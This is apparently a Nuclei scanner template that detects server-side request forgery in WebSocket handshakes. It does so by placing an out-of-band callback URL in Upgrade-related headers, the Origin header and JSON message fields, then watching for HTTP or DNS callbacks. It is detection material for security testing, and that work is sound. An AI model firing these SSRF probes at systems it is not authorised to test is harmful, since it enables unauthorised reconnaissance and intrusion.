id: websocket-upgrade-oob

info:
  name: WebSocket Upgrade Header Injection OOB Detection
  author: geeknik
  severity: medium
  description: |
    Detects WebSocket endpoints that improperly handle Upgrade headers with external URLs,
    potentially leading to SSRF through WebSocket-Sec-WebSocket-Protocol or custom headers
    that trigger external connections during the WebSocket handshake process.
  reference:
    - https://tools.ietf.org/html/rfc6455
    - https://portswigger.net/web-security/websockets
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-918
  tags: websocket,oob,ssrf,upgrade,handshake

variables:
  callback_url: "{{interactsh-url}}"

websocket:
  - address: "{{BaseURL}}"
    path:
      - "/ws"
      - "/websocket"
      - "/socket.io/"
      - "/api/ws"
      - "/chat"
      - "/live"
      - "/stream"

    headers:
      Sec-WebSocket-Protocol: "{{callback_url}}"
      Sec-WebSocket-Extensions: "permessage-deflate; server_max_window_bits"
      Origin: "{{callback_url}}"

    inputs:
      - data: |
          {
            "type": "upgrade_test",
            "protocol": "{{callback_url}}",
            "callback_url": "{{callback_url}}/websocket-upgrade"
          }
      - data: |
          {
            "command": "connect",
            "external_protocol": "{{callback_url}}",
            "origin": "{{callback_url}}"
          }
      - data: |
          {
            "action": "handshake_callback",
            "webhook_url": "{{callback_url}}/callback",
            "external_origin": "{{callback_url}}"
          }

  - address: "{{BaseURL}}"
    path:
      - "/ws"
      - "/websocket"
      - "/socket.io/"
      - "/api/ws"

    headers:
      X-Forwarded-Proto: "{{callback_url}}"
      X-WebSocket-Callback: "{{callback_url}}/callback"
      X-External-Origin: "{{callback_url}}"

    inputs:
      - data: |
          {
            "type": "protocol_injection",
            "forward_to": "{{callback_url}}",
            "proxy_target": "{{callback_url}}/proxy"
          }

matchers:
  - type: word
    part: interactsh_protocol
    words:
      - "http"
      - "dns"
    condition: or